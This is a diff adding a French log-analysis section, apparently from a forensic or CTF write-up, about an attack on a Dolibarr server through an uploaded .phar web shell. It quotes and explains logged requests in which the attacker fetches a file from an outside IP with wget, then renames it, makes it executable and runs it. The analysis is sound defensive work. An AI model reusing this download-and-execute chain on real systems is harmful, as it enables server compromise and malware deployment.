@@ -73,3 +73,45 @@ Examinons attentivement les logs après que l'attaquant ait testé plusieurs ext
 4. **Confirmation** : L'extension `.phar` est la seule qui a fonctionné avec succès et a été utilisée par l'attaquant pour exécuter des commandes sur le serveur via le paramètre `cmd=id`.
 
 On en déduit donc que l'extension que l'attaquant utilise finalement pour poursuivre l'attaque est **`.phar`**, après avoir testé plusieurs autres extensions sans succès.
+
+### 4.
+
+Voici les lignes pertinentes :
+
+```
+192.168.1.10 - - [23/May/2023:09:55:20 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=wget%20http://240.123.207.20/fiche_de_poste.odt HTTP/1.1" 200 486 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
+192.168.1.10 - - [23/May/2023:09:55:38 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=mv%20fiche_de_poste.odt%20fiche_de_poste HTTP/1.1" 200 203 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
+192.168.1.10 - - [23/May/2023:09:55:52 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=chmod%20755%20fiche_de_poste HTTP/1.1" 200 203 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
+192.168.1.10 - - [23/May/2023:09:58:22 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=./fiche_de_poste HTTP/1.1" 200 245 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
+```
+
+### Analyse des commandes exécutées :
+
+1. **Commande 1 (wget)** :
+   ```
+   192.168.1.10 - - [23/May/2023:09:55:20 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=wget%20http://240.123.207.20/fiche_de_poste.odt HTTP/1.1" 200 486
+   ```
+   - L'attaquant utilise la commande **`wget`** pour télécharger un fichier appelé **`fiche_de_poste.odt`** depuis l'adresse IP **240.123.207.20**.
+   - Cette commande est utilisée pour récupérer un fichier à distance et l'enregistrer sur le serveur compromis.
+
+2. **Commande 2 (mv)** :
+   ```
+   192.168.1.10 - - [23/May/2023:09:55:38 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=mv%20fiche_de_poste.odt%20fiche_de_poste HTTP/1.1" 200 203
+   ```
+   - L'attaquant renomme ensuite le fichier téléchargé avec la commande **`mv`**, en le passant de **`fiche_de_poste.odt`** à **`fiche_de_poste`**.
+   - Cela peut être une étape pour préparer ce fichier à être exécuté comme un script ou un programme.
+
+3. **Commande 3 (chmod)** :
+   ```
+   192.168.1.10 - - [23/May/2023:09:55:52 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=chmod%20755%20fiche_de_poste HTTP/1.1" 200 203
+   ```
+   - L'attaquant modifie les permissions du fichier avec la commande **`chmod 755`**. 
+   - Cela donne des permissions d'exécution (lecture, écriture, et exécution pour l'utilisateur) au fichier **`fiche_de_poste`**, ce qui indique que le fichier est probablement un script ou un programme que l'attaquant veut exécuter.
+
+4. **Commande 4 (exécution du fichier)** :
+   ```
+   192.168.1.10 - - [23/May/2023:09:58:22 +0100] "GET /dolibarr/documents/users/2/64nxlskk.phar?cmd=./fiche_de_poste HTTP/1.1" 200 245
+   ```
+   - Enfin, l'attaquant exécute directement le fichier **`fiche_de_poste`** en utilisant **`./fiche_de_poste`**, ce qui indique que le fichier téléchargé est exécuté comme un script ou un binaire.
+   - Cela suggère que ce fichier pourrait contenir du code malveillant ou être un outil permettant à l'attaquant de poursuivre l'exploitation du serveur.
+
